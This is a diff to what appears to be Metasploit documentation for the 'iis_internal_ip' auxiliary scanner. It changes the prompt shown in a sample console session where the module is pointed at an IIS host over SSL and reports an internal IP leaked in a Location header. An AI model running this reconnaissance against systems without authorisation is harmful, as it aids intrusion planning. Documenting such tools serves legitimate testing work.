@@ -21,17 +21,17 @@ IP address in then body
 ### IIS with SSL
 
 ```
-msf5 > use auxiliary/scanner/http/iis_internal_ip
-msf5 auxiliary(scanner/http/iis_internal_ip) > set ssl true
+msf > use auxiliary/scanner/http/iis_internal_ip
+msf auxiliary(scanner/http/iis_internal_ip) > set ssl true
 [!] Changing the SSL option's value may require changing RPORT!
 ssl => true
-msf5 auxiliary(scanner/http/iis_internal_ip) > set rport 443
+msf auxiliary(scanner/http/iis_internal_ip) > set rport 443
 rport => 443
-msf5 auxiliary(scanner/http/iis_internal_ip) > set rhosts 2.2.2.2
+msf auxiliary(scanner/http/iis_internal_ip) > set rhosts 2.2.2.2
 rhosts => 2.2.2.2
-msf5 auxiliary(scanner/http/iis_internal_ip) > set verbose true
+msf auxiliary(scanner/http/iis_internal_ip) > set verbose true
 verbose => true
-rmsf5 auxiliary(scanner/http/iis_internal_ip) > run
+rmsf auxiliary(scanner/http/iis_internal_ip) > run
 
 [*] 2.2.2.2:443     - Requesting GET / HTTP/1.0
 [+] Location Header: https://10.1.1.20/home
